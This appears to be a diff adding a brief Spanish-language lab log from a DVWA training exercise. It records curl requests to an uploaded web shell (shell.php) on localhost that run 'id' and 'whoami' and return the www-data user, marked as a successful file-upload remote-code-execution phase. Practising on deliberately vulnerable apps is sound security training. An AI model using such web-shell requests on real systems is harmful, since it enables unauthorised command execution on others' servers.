@@ -1,0 +1,8 @@
+curl http://127.0.0.1/DVWA/hackable/uploads/shell.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+curl http://127.0.0.1/DVWA/hackable/uploads/shell.php?cmd=whoami
+www-data
+
+Fecha: Mon Sep  7 11:16:07 AM CST 2026
+Fase 7 - File Upload RCE exitoso
